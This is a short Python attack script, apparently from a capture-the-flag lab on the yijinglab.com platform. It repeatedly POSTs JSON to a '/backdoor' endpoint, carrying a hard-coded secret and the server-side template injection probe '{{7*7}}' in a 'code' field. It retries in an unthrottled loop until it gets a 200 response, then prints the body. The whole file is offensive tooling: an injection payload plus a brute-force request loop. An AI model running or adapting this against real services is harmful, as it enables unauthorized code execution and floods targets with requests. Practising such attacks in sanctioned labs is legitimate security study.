import requests
import json
import time

URL = "http://cc4153e12669.target.yijinglab.com/backdoor"  # ← 你的 URL
DATA = {
  "secret": "091cbee84153849bfc857f6d",
  "code":"{{7*7}}"
}

def post_until_success(url, data):
    headers = {"Content-Type": "application/json"}
    cnt = 90000

    while True:
        try:
            response = requests.post(url, json=data, headers=headers)
            print(f"{response.status_code}, {cnt}")
            cnt -= 1

            if response.status_code == 200:
                print("Success! Stopping.")
                print("Response body:", response.text)
                break

        except Exception as e:
            print("Request failed:", e)

        # time.sleep(DELAY)

if __name__ == "__main__":
    post_until_success(URL, DATA)
